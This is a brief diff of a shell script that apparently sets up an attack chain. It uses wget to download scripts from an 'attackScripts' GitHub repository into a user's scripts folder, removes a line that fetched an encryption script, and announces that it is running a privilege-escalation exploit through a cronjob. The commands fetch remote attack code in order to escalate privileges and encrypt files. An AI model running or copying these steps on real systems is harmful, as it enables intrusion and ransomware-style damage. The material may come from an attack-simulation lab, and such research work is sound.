@@ -24,7 +24,6 @@ wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/attack_chai
 chmod -R +x /home/resch/.scripts
 # Other files
 wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/encryption/requirements.txt
-wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/encryption/encrypt.py
 
 echo "Start of exploit...."
 echo "Running PE exploit for cronjob..."
